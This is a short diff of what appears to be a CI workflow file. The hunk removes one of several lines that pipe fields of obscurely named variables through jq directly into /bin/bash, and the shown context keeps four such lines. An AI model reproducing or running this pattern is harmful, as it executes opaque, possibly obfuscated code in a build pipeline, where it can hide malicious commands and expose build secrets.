@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$nam6" | jq -r .ewr98 | /bin/bash
           echo $anhn284 | jq -r .utpvf248 | /bin/bash
           echo $szodh55634 | jq -r .svu0111 | /bin/bash
-          echo $ccnch03250 | jq -r .mmco01 | /bin/bash
           printf '%s' "$qxqjo6391" | jq -r .d6 | /bin/bash
 
       - name: Upload output
